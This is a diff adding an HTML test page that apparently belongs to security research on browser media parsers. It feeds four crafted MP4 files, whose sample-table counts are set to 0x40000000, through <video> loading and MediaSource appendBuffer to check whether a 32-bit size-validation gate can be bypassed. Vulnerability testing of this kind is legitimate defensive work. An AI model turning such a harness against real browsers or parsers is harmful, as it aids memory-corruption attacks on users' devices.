@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Evil MP4 32-bit Gate Bypass Test</title>
+    <style>
+        body { font-family: monospace; padding: 20px; background: #1a1a2e; color: #eee; }
+        .log { background: #0f0f23; padding: 10px; margin: 10px 0; border-radius: 4px; white-space: pre-wrap; max-height: 400px; overflow: auto; }
+        .pass { color: #0f0; }
+        .fail { color: #f00; }
+        .warn { color: #ff0; }
+        button { background: #2a2a4a; color: #eee; border: 1px solid #444; padding: 8px 16px; margin: 4px; cursor: pointer; border-radius: 4px; }
+        button:hover { background: #3a3a5a; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        video { display: none; }
+        .file-row { display: flex; align-items: center; gap: 10px; margin: 8px 0; flex-wrap: wrap; }
+        .file-name { min-width: 280px; }
+    </style>
+</head>
+<body>
+    <h1>🎯 Evil MP4 32-bit Gate Bypass Test</h1>
+    <p>Tests stss/stsz/stco/stsc with count=0x40000000 to bypass 32-bit count*size <= payload gate.</p>
+    
+    <div>
+        <button id="testUrlBtn" onclick="runUrlTests()">Test via URL Load (<video src>)</button>
+        <button id="testMseBtn" onclick="runMseTests()">Test via MSE (appendBuffer)</button>
+        <button id="testAllBtn" onclick="runAllTests()">Run All Tests</button>
+        <button id="clearBtn" onclick="clearLog()">Clear Log</button>
+    </div>
+    
+    <div id="results"></div>
+    <div id="log" class="log"></div>
+
+    <script>
+        const files = [
+            'evil_stss_32bit_gate.mp4',
+            'evil_stsz_32bit_gate.mp4',
+            'evil_stco_32bit_gate.mp4',
+            'evil_stsc_32bit_gate.mp4'
+        ];
+
+        const baseUrl = 'media/';
+        const logEl = document.getElementById('log');
+        const resultsEl = document.getElementById('results');
+
+        function log(msg, cls = '') {
+            const line = document.createElement('div');
+            line.className = cls;
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logEl.appendChild(line);
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        function clearLog() {
+            logEl.innerHTML = '';
+            resultsEl.innerHTML = '';
+        }
+
+        function addResult(file, method, status, details = '') {
+            const row = document.createElement('div');
+            row.className = 'file-row';
+            const cls = status === 'canplay' || status === 'mse_appended' ? 'pass' : 
+                        status === 'error' || status === 'mse_error' ? 'fail' : 'warn';
+            row.innerHTML = `
+                <span class="file-name">${file}</span>
+                <span class="${cls}">[${method}] ${status.toUpperCase()}</span>
+                <span>${details}</span>
+            `;
+            resultsEl.appendChild(row);
+        }
+
+        // URL Load Test (standard <video src>)
+        function testUrlLoad(filename) {
+            return new Promise((resolve) => {
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                
+                const cleanup = () => {
+                    video.removeEventListener('error', onError);
+                    video.removeEventListener('canplay', onCanPlay);
+                    video.removeEventListener('stalled', onStalled);
+                    video.src = '';
+                    video.remove();
+                };
+                
+                const onError = (e) => {
+                    cleanup();
+                    log(`[URL] ${filename} ERROR: ${video.error?.code} ${video.error?.message}`, 'fail');
+                    resolve({file: filename, method: 'url', status: 'error', error: video.error});
+                };
+                
+                const onCanPlay = () => {
+                    cleanup();
+                    log(`[URL] ${filename} CANPLAY - GATE PASSED!`, 'pass');
+                    resolve({file: filename, method: 'url', status: 'canplay'});
+                };
+                
+                const onStalled = () => {
+                    log(`[URL] ${filename} STALLED`, 'warn');
+                };
+                
+                video.addEventListener('error', onError);
+                video.addEventListener('canplay', onCanPlay);
+                video.addEventListener('stalled', onStalled);
+                
+                video.src = baseUrl + filename;
+                video.load();
+                
+                setTimeout(() => {
+                    cleanup();
+                    log(`[URL] ${filename} TIMEOUT`, 'warn');
+                    resolve({file: filename, method: 'url', status: 'timeout'});
+                }, 15000);
+            });
+        }
+
+        // MSE Test (MediaSource appendBuffer)
+        function testMse(filename) {
+            return new Promise((resolve) => {
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                
+                const ms = new MediaSource();
+                video.src = URL.createObjectURL(ms);
+                
+                const cleanup = () => {
+                    URL.revokeObjectURL(video.src);
+                    video.src = '';
+                    video.remove();
+                };
+                
+                ms.addEventListener('sourceopen', async () => {
+                    try {
+                        const sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
+                        
+                        sb.addEventListener('error', (e) => {
+                            cleanup();
+                            log(`[MSE] ${filename} SourceBuffer ERROR`, 'fail');
+                            resolve({file: filename, method: 'mse', status: 'mse_error', error: e});
+                        });
+                        
+                        sb.addEventListener('updateend', () => {
+                            log(`[MSE] ${filename} appendBuffer complete`, 'pass');
+                            // Try to play
+                            video.play().catch(() => {});
+                        });
+                        
+                        log(`[MSE] ${filename} fetching...`);
+                        const resp = await fetch(baseUrl + filename);
+                        const buf = await resp.arrayBuffer();
+                        log(`[MSE] ${filename} fetched ${buf.byteLength} bytes, appending...`);
+                        sb.appendBuffer(buf);
+                        
+                    } catch (e) {
+                        cleanup();
+                        log(`[MSE] ${filename} ERROR: ${e.message}`, 'fail');
+                        resolve({file: filename, method: 'mse', status: 'mse_error', error: e.message});
+                    }
+                });
+                
+                ms.addEventListener('sourceclose', () => {
+                    cleanup();
+                    log(`[MSE] ${filename} MediaSource closed`);
+                    resolve({file: filename, method: 'mse', status: 'mse_closed'});
+                });
+                
+                setTimeout(() => {
+                    cleanup();
+                    log(`[MSE] ${filename} TIMEOUT`, 'warn');
+                    resolve({file: filename, method: 'mse', status: 'mse_timeout'});
+                }, 20000);
+            });
+        }
+
+        async function runUrlTests() {
+            log('=== Starting URL Load Tests ===');
+            for (const f of files) {
+                const r = await testUrlLoad(f);
+                addResult(f, 'URL', r.status, r.error?.message || '');
+                await new Promise(r => setTimeout(r, 1000));
+            }
+            log('=== URL Tests Complete ===');
+        }
+
+        async function runMseTests() {
+            log('=== Starting MSE Tests ===');
+            for (const f of files) {
+                const r = await testMse(f);
+                addResult(f, 'MSE', r.status, r.error?.message || '');
+                await new Promise(r => setTimeout(r, 1000));
+            }
+            log('=== MSE Tests Complete ===');
+        }
+
+        async function runAllTests() {
+            await runUrlTests();
+            await new Promise(r => setTimeout(r, 2000));
+            await runMseTests();
+        }
+
+        // Keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            if (e.key === '1') runUrlTests();
+            if (e.key === '2') runMseTests();
+            if (e.key === '3') runAllTests();
+            if (e.key === 'c') clearLog();
+        });
+
+        log('Ready. Press 1=URL tests, 2=MSE tests, 3=All, C=Clear');
+    </script>
+</body>
+</html>
